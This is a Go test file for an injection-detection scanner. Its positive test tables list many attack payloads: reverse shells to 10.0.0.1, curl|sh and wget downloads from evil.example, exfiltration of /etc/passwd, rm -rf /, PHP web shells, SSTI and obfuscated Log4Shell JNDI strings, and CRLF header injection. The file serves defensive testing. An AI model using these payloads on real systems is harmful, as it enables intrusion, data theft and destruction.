package detect

import (
	"strings"
	"testing"
	"time"

	"github.com/ergasterion-dev/aegolith/internal/model"
)

// injectionLegit is realistic customer input (delivery notes, product names,
// reviews, addresses, contact details) that no injection detector may flag.
var injectionLegit = []string{
	"milk & bread",
	"Gate code 1234 & leave at door",
	"see you; thanks",
	"Basmati Rice (5 kg)",
	"Long-grain; aged 2 years. Best for biryani/pulao.",
	"price: {{ check later }}",
	"Fresh & tasty 😋 – 5/5!",
	"Flat 3B, Rajbagh",
	"id card copy",
	"cat food 2kg",
	"50% off",
	"ayesha.khan@example.com",
	"https://example.com/review",
	"$5 off",
	"${price}",
	"{{name}}",
	"House #12, Lal Chowk, Srinagar 190001",
	"Please ring the bell, don't knock.\nCall on arrival.\r\nThanks!",
	"دودھ اور روٹی، دروازے پر چھوڑ دیں",
	"दूध और ब्रेड; गेट पर छोड़ दें",
}

// Positive and negative tables, package-level so that ScanText's tests
// (scan_test.go) can run every one of them through the combined scan.
var (
	cmdIPositives = []string{
		"; id",
		"| cat /etc/passwd",
		"`whoami`",
		"$(curl http://evil.example/x.sh | sh)",
		"&& wget http://evil.example/m -O /tmp/m",
		"; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
		"; nc -e /bin/sh 10.0.0.1 4444",
		`& type C:\Windows\win.ini`,
		"; powershell -enc SQBFAFgA",
		"9999999999; cat /etc/passwd",
		"() { :; }; /bin/bash -c 'cat /etc/passwd'",
		// Beyond the brief.
		"x;id",
		"$(id)",
		"|| ls -la",
		"1\nid -u",
		"%0Aid%3B",
		"x\n/bin/sh -i",
		"& type \\\\host\\share\\x",
		"& cmd /c whoami",
		"& dir /s",
		"; powershell -nop -c iex",
		"; nc -n -v -l -p 4444 -e /bin/sh",
		"; nc -lvnp 4444",
		"; nc -lvp 4444",
		"| nc -l -p 4444",
		"; ncat -e sh 10.0.0.1",
		"&& curl -X POST -d @/etc/passwd http://x",
		"; ping -c 3 -i 1 -W 1 -s 64 10.0.0.1",
		"; cat -- /etc/passwd",
		"; chmod +x m",
		"; chmod 777 /tmp/m",
		"; chmod u+s m",
		"%0aid",
		"%0aid%0a",
		"x%0awhoami",
		"x%0als%0a",
		"x%0D%0Aid",
		"a; /usr/bin/id",
		"& DIR C:\\",
		"; uname -a",
		"%3B%20id",
		"; rm -rf /",
		"| ping -c 3 10.0.0.1",
		"&& curl -s evil.example | sh",
		"; python -c 'import os'",
		"; chmod +x /tmp/m",
		"0<&196;exec 196<>/dev/udp/10.0.0.1/53",
	}
	cmdINegatives = []string{
		"see you; id card copy",
		"Bring your ID; ID card copy needed",
		"Call on arrival\nID",
		"milk | cat food",
		"Toys; cat $5 each",
		"type of rice?",
		"Rice; type: basmati",
		"Hair care | curl cream",
		"Ring bell; ping me when here",
		"Flat 3B; rm 12",
		"Pets: snake | python",
		"Birthday bash; balloons & cake",
		"Sizes S | M | L | XL",
		"Rs 500; /kg",
		"Go straight; dir left after the mosque",
		"cat/dog bowl; cat /2 bags",
		"Monday & Tuesday & cmd",
		"Smile () thanks",
		"ls",
		"whoami is a fun game",
		"Fresh & ls brand",
		"Leave with guard & sh. Ali",
		"Nice shop | nice people",
		"House 12, Main Bazar\nTimergara\nDir",
		"Timergara; Dir",
		"Order & type -C cable",
		"Gift wrap\nType -Large",
		"Rice; type -- basmati",
		"Dog food & cat -- both great",
		"bring id\nid -- card",
		"Pack & curl -ing iron",
		"mobile: 0300-1234567 | ping -me",
		"Pet shop: dog & cat https://example.com/cat-food",
		"Notes:\nls",
		"Notes:\nid\nThanks",
		"Upper Dir / Lower Dir",
		"Sizes & type -- S, M, L",
		"Shirt size -L size",
		"T-shirt & cat -L size",
		"Mug | cat -XL",
		"Tea & cat -lovers mug",
		"Cat litter; cat -5 kg off",
		"Delivery & ping -Ali at gate",
		"House 12\nNear Main Bazar\nDir Upper\nPhone 0300-1234567",
		"Tea & ls -lovers mug",
		"Notes; chmod later",
		"Call me | nc -sorry 12 hours",
	}
	codeIPositives = []string{
		"<?php system($_GET['c']); ?>",
		"eval(base64_decode('cGhwaW5mbygpOw=='))",
		"require('child_process').exec('id')",
		// Beyond the brief.
		"<?= `id` ?>",
		"<?PHP echo 1; ?>",
		"assert (base64_decode('cGhwaW5mbygpOw=='))",
		"process.mainModule.require('child_process').execSync('id')",
		`require("child_process").spawn("sh")`,
		"%3C%3Fphp%20phpinfo()%3B",
	}
	codeISerializedPositives = []string{
		"rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ==",
		"aced00057372001",
		"data=rO0ABXNy",
		"ACED0005737200",
	}
	codeINegatives = []string{
		"eval(uation) pending",
		"assert your rights",
		"<? what is this",
		"Is it <?",
		"base64_decode is a function name",
		"child process care",
		"the process. mainModule",
		"aced0005-9b1e-4c1a-8f00-123456789abc",
		"order xrO0ABXNy",
		"Room 0AB, block 5",
		"I'm in the middle of a process.",
	}
	ldapPositives = []string{
		"*)(uid=*))(|(uid=*",
		// Beyond the brief.
		"admin)(&(password=*)",
		"x)(!(objectClass=*)",
		"*)(objectClass=*",
		"%2A%29%28uid%3D%2A",
	}
	ldapNegatives = []string{
		"(2 pcs)(blue)",
		"Rice (5 kg) * (2)",
		"smile :)(",
		"*(see note)",
		"a*b",
		"Size (M)(L) & (XL)",
		"5 stars* (see review)",
	}
	sstiPositives = []string{
		"{{config.items()}}",
		"{{''.__class__.__mro__[1].__subclasses__()}}",
		"${T(java.lang.Runtime).getRuntime().exec('id')}",
		"{{ .Env }}",
		// Beyond the brief.
		"{{config}}",
		"{{ self._TemplateReference__context }}",
		"{{request.application.__globals__}}",
		"{{ 7*7 }}",
		"{{ x | safe }}",
		"{{ lipsum() }}",
		"#{7*7}",
		"#{T(java.lang.Runtime)}",
		"<%= 7*7 %>",
		"{% import os %}",
		"{%for x in y%}",
		"%7B%7Bconfig%7D%7D",
		"{{ {{config.items()}}",
	}
	sstiNegatives = []string{
		"{{ first_name }}",
		"Hi {{name}}, your order {{order_id}} is ready",
		"{{ self pickup }}",
		"{{ special request please }}",
		"{{ configure later }}",
		"{{...}}",
		"{{",
		"}} {{",
		"Order #{12}",
		"Flat #{3B}",
		"#1 seller",
		"<% off",
		"50% {%} off",
		"{% discount %}",
		"Total ${ 500 }",
		"${T}",
	}
	jndiPositives = []string{
		"${jndi:ldap://evil.example/a}",
		"${${lower:j}ndi:${lower:l}dap://evil.example/a}",
		"${jndi:rmi://evil.example/x}",
		"${jndi:dns://evil.example/a}",
		// Beyond the brief.
		"${JnDi:ldap://evil.example/a}",
		"${${::-j}${::-n}${::-d}${::-i}:ldap://evil.example/a}",
		"${${env:BARFOO:-j}ndi${env:BARFOO:-:}ldap://evil.example/a}",
		"${${upper:j}${upper:n}di:ldap://evil.example/a}",
		"User-Agent: ${jndi:ldap://evil.example/a",
		"%24%7Bjndi:ldap://evil.example/a%7D",
	}
	jndiNegatives = []string{
		"${name} lower:",
		"jndi:ldap is a Java thing",
		"${lower:hello}",
		"${::-x}${::-y}",
		"}}}${${${",
	}
	crlfPositives = []string{
		"x%0d%0aSet-Cookie:%20admin=true",
		"x\r\nSet-Cookie: admin=true",
		// Beyond the brief.
		"x\nset-cookie : a=1",
		"x%0aLocation:%20http://evil.example",
		"x\r\nLocation: //evil.example",
		"x%0D%0AContent-Length:%200",
		"x\r\nContent-Type: text/html",
		"x\rTransfer-Encoding: chunked",
		"x\r\nAccess-Control-Allow-Origin: *",
	}
	crlfNegatives = []string{
		"Line 1\nNote: ring bell",
		"Address:\r\nFlat 3B\r\nLocation: near masjid",
		"Item list\nContent: rice, dal",
		"Time:\n5pm",
		"Notes\r\nSet up a time: 5pm",
		"Set-Cookie: on one line is just text",
		"Cookie: chocolate chip\nCookies: 2 packs",
	}
)

func assertHits(t *testing.T, name string, fn func(string) (Hit, bool), want Hit, vals []string) {
	t.Helper()
	for _, v := range vals {
		hit, ok := fn(v)
		if !ok {
			t.Errorf("%s(%q) = no hit, want hit", name, v)
			continue
		}
		if hit != want {
			t.Errorf("%s(%q) = %+v, want %+v", name, v, hit, want)
		}
	}
}

func assertNoHits(t *testing.T, name string, fn func(string) (Hit, bool), vals []string) {
	t.Helper()
	for _, v := range append(append([]string(nil), vals...), injectionLegit...) {
		if hit, ok := fn(v); ok {
			t.Errorf("%s(%q) = %+v, want no hit", name, v, hit)
		}
	}
}

func TestCmdIPositives(t *testing.T) {
	want := Hit{RuleID: "AEG-CMDI-001", Category: model.CatCmdi, Severity: model.SeverityCritical}
	assertHits(t, "CmdI", CmdI, want, cmdIPositives)
}

func TestCmdINegatives(t *testing.T) {
	assertNoHits(t, "CmdI", CmdI, cmdINegatives)
}

func TestCodeIPositives(t *testing.T) {
	want := Hit{RuleID: "AEG-CODEI-001", Category: model.CatCodei, Severity: model.SeverityCritical}
	assertHits(t, "CodeI", CodeI, want, codeIPositives)
	ser := Hit{RuleID: "AEG-CODEI-002", Category: model.CatCodei, Severity: model.SeverityCritical}
	assertHits(t, "CodeI", CodeI, ser, codeISerializedPositives)
}

func TestCodeINegatives(t *testing.T) {
	assertNoHits(t, "CodeI", CodeI, codeINegatives)
}

func TestLDAPPositives(t *testing.T) {
	want := Hit{RuleID: "AEG-LDAP-001", Category: model.CatLDAP, Severity: model.SeverityHigh}
	assertHits(t, "LDAP", LDAP, want, ldapPositives)
}

func TestLDAPNegatives(t *testing.T) {
	assertNoHits(t, "LDAP", LDAP, ldapNegatives)
}

func TestSSTIPositives(t *testing.T) {
	want := Hit{RuleID: "AEG-SSTI-001", Category: model.CatSSTI, Severity: model.SeverityHigh}
	assertHits(t, "SSTI", SSTI, want, sstiPositives)
}

func TestSSTINegatives(t *testing.T) {
	assertNoHits(t, "SSTI", SSTI, sstiNegatives)
}

func TestJNDIPositives(t *testing.T) {
	want := Hit{RuleID: "AEG-JNDI-001", Category: model.CatJNDI, Severity: model.SeverityCritical}
	assertHits(t, "JNDI", JNDI, want, jndiPositives)
}

func TestJNDINegatives(t *testing.T) {
	assertNoHits(t, "JNDI", JNDI, jndiNegatives)
}

func TestCRLFPositives(t *testing.T) {
	want := Hit{RuleID: "AEG-CRLF-001", Category: model.CatCRLF, Severity: model.SeverityHigh}
	assertHits(t, "CRLF", CRLF, want, crlfPositives)
}

func TestCRLFNegatives(t *testing.T) {
	assertNoHits(t, "CRLF", CRLF, crlfNegatives)
}

// TestInjectionAdversarialTime checks the scanners stay linear on long
// repetitions of their own trigger sequences.
func TestInjectionAdversarialTime(t *testing.T) {
	inputs := map[string]string{
		"cmdi":   strings.Repeat("; id x", 1400),
		"ldap":   strings.Repeat(")(", 4096),
		"ssti":   strings.Repeat("{{", 4096),
		"ssti2":  strings.Repeat("{{ a ", 1600) + "}}",
		"ssti3":  strings.Repeat("{%", 4096),
		"ssti4":  strings.Repeat("#{", 4096),
		"jndi":   strings.Repeat("${::-", 1600) + strings.Repeat("a", 512) + strings.Repeat("}", 1600),
		"jndi2":  strings.Repeat("${", 4096),
		"jndi3":  strings.Repeat("${a", 1365) + strings.Repeat("}", 1365),
		"quotes": "; cat " + strings.Repeat("'", 8192),
		"cmdi2":  strings.Repeat("|", 8192),
		"shock":  strings.Repeat("() {", 2048),
		"crlf":   strings.Repeat("\r\n", 4096),
		"codei":  strings.Repeat("<?eval(", 1170),
	}
	fns := []func(string) (Hit, bool){CmdI, CodeI, LDAP, SSTI, JNDI, CRLF}
	for name, in := range inputs {
		for _, fn := range fns {
			if d := bestOf(3, func() { fn(in) }); d > 2*time.Millisecond {
				t.Errorf("%s: %v on %d bytes, want under 2ms", name, d, len(in))
			}
		}
	}
}

// TestJNDILargePayloadTime checks nested lookups around a large payload:
// resolving moves the payload up one level per close, so the cost is
// bounded by the depth cap times the length.
func TestJNDILargePayloadTime(t *testing.T) {
	for _, size := range []int{64 << 10, 1 << 20} {
		payload := strings.Repeat("a", size)
		for _, depth := range []int{maxLookupDepth, 1000} {
			for _, open := range []string{"${lower:", "${upper:", "${x:-", "${::-"} {
				in := strings.Repeat(open, depth) + payload + strings.Repeat("}", depth)
				if d := bestOf(3, func() { JNDI(in) }); d > raceSlowdown*10*time.Millisecond {
					t.Errorf("JNDI(%q x %d around %d bytes): %v, want under %v", open, depth, size, d, raceSlowdown*10*time.Millisecond)
				}
			}
		}
	}
	// One level past the cap is reported, not resolved.
	deep := strings.Repeat("${x:-", maxLookupDepth+1) + "a" + strings.Repeat("}", maxLookupDepth+1)
	if _, ok := JNDI(deep); !ok {
		t.Errorf("JNDI on %d nested lookups = no hit, want hit", maxLookupDepth+1)
	}
	if _, ok := JNDI(strings.Repeat("${x:-", maxLookupDepth) + "a" + strings.Repeat("}", maxLookupDepth)); ok {
		t.Errorf("JNDI on %d nested lookups without jndi = hit, want none", maxLookupDepth)
	}
}

// bestOf returns the fastest of n runs of f, to keep scheduler noise out of
// timing assertions.
func bestOf(n int, f func()) time.Duration {
	best := time.Duration(1<<63 - 1)
	for i := 0; i < n; i++ {
		start := time.Now()
		f()
		if d := time.Since(start); d < best {
			best = d
		}
	}
	return best
}
